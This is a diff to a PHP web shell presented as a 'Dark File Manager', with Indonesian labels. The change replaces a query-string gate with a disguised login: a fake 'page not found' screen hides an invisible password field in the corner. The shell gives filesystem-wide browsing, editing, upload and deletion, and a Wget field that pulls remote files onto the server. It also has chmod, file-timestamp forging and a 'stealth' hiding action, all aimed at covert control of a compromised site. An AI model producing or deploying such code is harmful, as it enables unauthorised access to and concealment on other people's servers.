@@ -1,11 +1,141 @@
 <?php
+$password_hash = '$2a$12$QLh7xqC2/49495gjTzGumeqQ12HatXJrvxnntoUW2kmFrUfCxVWdK';
+$login_title = 'This Page Does Not Exist';
+$login_subtitle = "Sorry, the page you are looking for could not be found. It's just an accident that was not intentional.";
 
-if (!isset($_GET['jancok']) || $_GET['jancok'] !== '1') {
-    header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
+session_start();
+
+if (isset($_POST['login_pass'])) {
+    if (password_verify($_POST['login_pass'], $password_hash)) {
+        $_SESSION['fm_auth'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error_msg = "Password salah!";
+    }
+}
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
     exit;
 }
 
-$base_dir = '.';
+if (!isset($_SESSION['base_dir'])) {
+    $_SESSION['base_dir'] = realpath('.');
+}
+$base_dir = $_SESSION['base_dir'];
+
+if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
+?>
+<!DOCTYPE html>
+<html lang="en-us" prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style type="text/css">
+        @charset "UTF-8";
+        [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak, .ng-hide:not(.ng-hide-animate) {
+            display: none !important;
+        }
+        ng\:form { display: block; }
+        .ng-animate-shim { visibility: hidden; }
+        .ng-anchor { position: absolute; }
+    </style>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title><?= htmlspecialchars($login_title) ?></title>
+    <meta name="description" content="Oops, looks like the page is lost.">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=DM+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
+</head>
+<body>
+    <div class="page-not-found">
+
+        <svg class="image" alt="Page Not Found" viewBox="0 0 24 24" width="150" height="150" style="fill:#6D7081; margin-bottom: 32px;">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
+        <h1 class="title"><?= htmlspecialchars($login_title) ?></h1>
+        <p class="text"><?= htmlspecialchars($login_subtitle) ?></p>
+
+
+        <div class="hidden-login-section">
+            <form method="POST">
+                <input type="password" name="login_pass" class="secret-input" autocomplete="current-password" autofocus>
+                <button type="submit" style="display:none;"></button>
+            </form>
+        </div>
+    </div>
+</body>
+<style>
+    body {
+        color: #1d1e20;
+        background: #f4f5ff;
+        font-size: 14px;
+        font-family: "DM Sans", "Roboto", sans-serif !important;
+        font-weight: 400;
+        -ms-text-size-adjust: 100%;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        margin: 0;
+    }
+    .page-not-found {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        padding: 0 16px;
+    }
+    .image {
+        max-width: 100%;
+        height: auto;
+        object-fit: contain;
+    }
+    .title {
+        text-align: center;
+        margin-top: 0;
+        margin-bottom: 8px;
+        font-size: 24px;
+        line-height: 32px;
+        font-weight: 700;
+    }
+    .text {
+        text-align: center;
+        max-width: 650px;
+        margin-bottom: 24px;
+        font-size: 16px;
+        line-height: 24px;
+        font-weight: 400;
+        color: #6D7081;
+    }
+    .hidden-login-section {
+        position: absolute;
+        bottom: 8px;
+        left: 8px;
+    }
+    .secret-input {
+        background: #f4f5ff !important;
+        color: #f4f5ff !important;
+        border: none !important;
+        outline: none !important;
+        width: 120px;
+        height: 20px;
+        font-size: 10px;
+        opacity: 0.01;
+        cursor: default;
+    }
+    .secret-input:focus {
+        opacity: 0.03;
+        background: #f4f5ff !important;
+        color: #f4f5ff !important;
+    }
+</style>
+</html>
+<?php
+    exit;
+}
+
 $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
 $dir = realpath($dir) ? realpath($dir) : realpath('.');
 
@@ -272,19 +402,19 @@ sort($files);
 <div class="container">
     <div class="top-bar">
         <h2 class="neon-title">⚡ Dark File Manager <span class="pro-badge">PRO v5</span></h2>
-        <a href="?jancok=1&logout=1" class="btn btn-red">Keluar (Logout)</a>
+        <a href="?logout=1" class="btn btn-red">Keluar (Logout)</a>
     </div>
 
     <div class="breadcrumb">
-        <a href="?jancok=1&dir=<?= urlencode($base_dir) ?>" class="btn" style="background:#0284c7; margin-right:10px; padding:4px 8px; font-size:11px;">🏠 Home</a>
+        <a href="?dir=<?= urlencode($base_dir) ?>" class="btn" style="background:#0284c7; margin-right:10px; padding:4px 8px; font-size:11px;">🏠 Home</a>
         <strong>Direktori: </strong>
         <?php
         $path_parts = explode(DIRECTORY_SEPARATOR, $dir);
         $accumulator = '';
         foreach ($path_parts as $index => $part) {
-            if ($part === '') { $accumulator = '/'; echo '<a href="?jancok=1&dir=%2F">root</a>/'; continue; }
+            if ($part === '') { $accumulator = '/'; echo '<a href="?dir=%2F">root</a>/'; continue; }
             $accumulator .= ($accumulator === '/') ? $part : DIRECTORY_SEPARATOR . $part;
-            echo '<a href="?jancok=1&dir=' . urlencode($accumulator) . '">' . htmlspecialchars($part) . '</a>/';
+            echo '<a href="?dir=' . urlencode($accumulator) . '">' . htmlspecialchars($part) . '</a>/';
         }
         ?>
     </div>
@@ -312,13 +442,13 @@ sort($files);
         </style>
 
         <h4 style="color: #38bdf8;">Editing File: <?= htmlspecialchars($filename_edit) ?></h4>
-        <form method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>" id="edit-form">
+        <form method="POST" action="?dir=<?= urlencode($dir) ?>" id="edit-form">
             <input type="hidden" name="edit_file_name" value="<?= htmlspecialchars($filename_edit) ?>">
             <textarea name="save_file_content" id="real-textarea" style="display:none;"><?= htmlspecialchars($file_content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></textarea>
             <div id="ace-editor"><?= htmlspecialchars($file_content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
             <br>
             <button type="submit" class="btn btn-green">Save Changes</button>
-            <a href="?jancok=1&dir=<?= urlencode($dir) ?>" class="btn btn-gray">Cancel</a>
+            <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-gray">Cancel</a>
         </form>
 
         <script>
@@ -343,19 +473,19 @@ sort($files);
 
     <!-- PANEL KONTROL UTAMA -->
     <div class="controls">
-        <form method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>" enctype="multipart/form-data">
+        <form method="POST" action="?dir=<?= urlencode($dir) ?>" enctype="multipart/form-data">
             <input type="file" name="upload_file" required>
             <button type="submit" class="btn btn-blue">Upload</button>
         </form>
-        <form method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>">
+        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
             <input type="text" name="new_folder" placeholder="Folder baru..." required>
             <button type="submit" class="btn btn-green">+ Folder</button>
         </form>
-        <form method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>">
+        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
             <input type="text" name="new_file" placeholder="File.php/txt..." required>
             <button type="submit" class="btn btn-green">+ File</button>
         </form>
-        <form method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>">
+        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
             <input type="text" name="wget_url" placeholder="https://... (Wget)" required style="width: 130px;">
             <button type="submit" class="btn btn-blue">Wget</button>
         </form>
@@ -364,12 +494,11 @@ sort($files);
     <!-- PENCARIAN -->
     <div class="controls" style="background: #111827;">
         <form method="GET" action="" style="display: flex; gap: 8px; width: 100%; margin: 0;">
-            <input type="hidden" name="jancok" value="1">
             <input type="hidden" name="dir" value="<?= htmlspecialchars($dir) ?>">
             <input type="text" name="search" placeholder="Cari global (.php, index, dll)..." value="<?= htmlspecialchars($_GET['search'] ?? '') ?>" style="flex-grow: 1;">
             <button type="submit" class="btn btn-blue">Cari</button>
             <?php if (!empty($_GET['search'])): ?>
-                <a href="?jancok=1&dir=<?= urlencode($dir) ?>" class="btn btn-gray">Reset</a>
+                <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-gray">Reset</a>
             <?php endif; ?>
         </form>
     </div>
@@ -381,7 +510,7 @@ sort($files);
                 <?php foreach ($search_results as $path): ?>
                     <li>
                         <span style="color:#94a3b8; font-size:14px;"><?= htmlspecialchars($path) ?></span>
-                        <a href="?jancok=1&dir=<?= urlencode(dirname($path)) ?>&edit=<?= urlencode(basename($path)) ?>" style="color:#38bdf8; margin-left:10px;">[Edit]</a>
+                        <a href="?dir=<?= urlencode(dirname($path)) ?>&edit=<?= urlencode(basename($path)) ?>" style="color:#38bdf8; margin-left:10px;">[Edit]</a>
                     </li>
                 <?php endforeach; ?>
             </ul>
@@ -389,7 +518,7 @@ sort($files);
     <?php endif; ?>
 
     <!-- TABEL FILE & FOLDER -->
-    <form method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>" id="batch-form">
+    <form method="POST" action="?dir=<?= urlencode($dir) ?>" id="batch-form">
         <div style="display: flex; gap: 10px; margin-bottom: 12px; align-items: center; background: #111827; padding: 10px; border-radius: 6px; border: 1px solid var(--border-color);">
             <span style="font-size: 13px; color: var(--text-muted); font-weight: 600;">⚡ Aksi Terpilih (Batch):</span>
             <select name="batch_action" id="batch-action-select" class="action-select" required style="width: 180px;">
@@ -416,7 +545,7 @@ sort($files);
                 <?php if (dirname($dir) !== $dir): ?>
                 <tr>
                     <td colspan="6">
-                        <a href="?jancok=1&dir=<?= urlencode(dirname($dir)) ?>" style="text-decoration:none; color: var(--accent-blue); font-weight: 600;">📁 [..] Naik satu tingkat</a>
+                        <a href="?dir=<?= urlencode(dirname($dir)) ?>" style="text-decoration:none; color: var(--accent-blue); font-weight: 600;">📁 [..] Naik satu tingkat</a>
                     </td>
                 </tr>
                 <?php endif; ?>
@@ -430,7 +559,7 @@ sort($files);
                 ?>
                 <tr>
                     <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($folder) ?>"></td>
-                    <td>📁 <a href="?jancok=1&dir=<?= urlencode($folder_path) ?>" style="text-decoration:none; color: var(--accent-blue); font-weight: 600;"><?= htmlspecialchars($folder) ?></a></td>
+                    <td>📁 <a href="?dir=<?= urlencode($folder_path) ?>" style="text-decoration:none; color: var(--accent-blue); font-weight: 600;"><?= htmlspecialchars($folder) ?></a></td>
                     <td style="color: var(--text-muted);">-</td>
                     <td style="color: var(--text-muted); font-family: monospace;"><?= $mtime ?></td>
                     <td>
@@ -461,7 +590,7 @@ sort($files);
                 ?>
                 <tr>
                     <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($file) ?>"></td>
-                    <td>📄 <a href="?jancok=1&dir=<?= urlencode($dir) ?>&edit=<?= urlencode($file) ?>" style="color: var(--text-main); text-decoration: none; font-weight: 600;"><?= htmlspecialchars($file) ?></a></td>
+                    <td>📄 <a href="?dir=<?= urlencode($dir) ?>&edit=<?= urlencode($file) ?>" style="color: var(--text-main); text-decoration: none; font-weight: 600;"><?= htmlspecialchars($file) ?></a></td>
                     <td style="color: var(--text-muted);"><?= $size ?></td>
                     <td style="color: var(--text-muted); font-family: monospace;"><?= $mtime ?></td>
                     <td>
@@ -487,22 +616,22 @@ sort($files);
     </form>
 </div>
 
-<form id="rename-form" method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>" style="display:none;">
+<form id="rename-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
     <input type="hidden" name="old_name" id="old_name">
     <input type="hidden" name="new_name" id="new_name">
 </form>
 
-<form id="chmod-form" method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>" style="display:none;">
+<form id="chmod-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
     <input type="hidden" name="target_path" id="chmod_target_path">
     <input type="hidden" name="new_permission" id="chmod_new_permission">
 </form>
 
-<form id="touch-form" method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>" style="display:none;">
+<form id="touch-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
     <input type="hidden" name="touch_path" id="touch_path">
     <input type="hidden" name="touch_date" id="touch_date">
 </form>
 
-<form id="hide-form" method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>" style="display:none;">
+<form id="hide-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
     <input type="hidden" name="hide_file_name" id="hide_file_name">
 </form>
 
@@ -530,9 +659,9 @@ function handleAction(selectObj, targetPath, fileName, currentMtime, currentPerm
     selectObj.value = ""; 
 
     if (action === 'edit') {
-        window.location.href = "?jancok=1&dir=<?= urlencode($dir) ?>&edit=" + encodeURIComponent(fileName);
+        window.location.href = "?dir=<?= urlencode($dir) ?>&edit=" + encodeURIComponent(fileName);
     } else if (action === 'download') {
-        window.location.href = "?jancok=1&dir=<?= urlencode($dir) ?>&download=" + encodeURIComponent(fileName);
+        window.location.href = "?dir=<?= urlencode($dir) ?>&download=" + encodeURIComponent(fileName);
     } else if (action === 'stealth') {
         if (confirm("Jalankan Stealth Mode pada file '" + fileName + "'?")) {
             document.getElementById('hide_file_name').value = fileName;
@@ -554,15 +683,15 @@ function handleAction(selectObj, targetPath, fileName, currentMtime, currentPerm
             document.getElementById('chmod-form').submit();
         }
     } else if (action === 'rename') {
-        var newName = prompt("Ubah nama baru:", fileName);
+        var newName = prompt("Ubah nama file/folder:", fileName);
         if (newName && newName !== fileName) {
             document.getElementById('old_name').value = fileName;
             document.getElementById('new_name').value = newName;
             document.getElementById('rename-form').submit();
         }
     } else if (action === 'delete') {
-        if (confirm("Yakin ingin menghapus '" + fileName + "'?")) {
-            window.location.href = "?jancok=1&dir=<?= urlencode($dir) ?>&delete=" + encodeURIComponent(fileName);
+        if (confirm("Hapus item '" + fileName + "'?")) {
+            window.location.href = "?dir=<?= urlencode($dir) ?>&delete=" + encodeURIComponent(fileName);
         }
     }
 }
